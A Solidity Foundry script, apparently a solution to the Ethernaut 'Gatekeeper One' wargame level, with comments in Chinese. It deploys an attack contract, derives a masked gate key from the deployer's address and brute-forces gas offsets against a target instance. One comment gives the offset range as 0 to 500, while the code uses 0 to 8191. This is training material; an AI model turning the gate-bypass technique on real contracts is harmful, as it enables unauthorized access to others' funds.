// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/GatekeeperOneAttack.sol";

contract AttackScript is Script {
    function run() external {
        // 1. 環境設定
        address target = vm.envAddress("INSTANCE_ADDRESS");
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        // 2. 廣播單筆交易：部署攻擊合約並讓它在鏈上自行暴力破解
        vm.startBroadcast(deployerPrivateKey);
        GatekeeperOneAttack attacker = new GatekeeperOneAttack();
        console.log("Attacker contract deployed at:", address(attacker));

        // Gate 3 key：保留最後兩個 bytes，清空中間兩個 bytes
        address myAddress = vm.addr(deployerPrivateKey);
        bytes8 gateKey = bytes8(uint64(uint160(myAddress)) & 0xFFFFFFFF0000FFFF);

        // 在鏈上嘗試偏移 0~500（可自行調整範圍）
        attacker.solve(target, gateKey, 0, 8191);

        vm.stopBroadcast();
    }
}
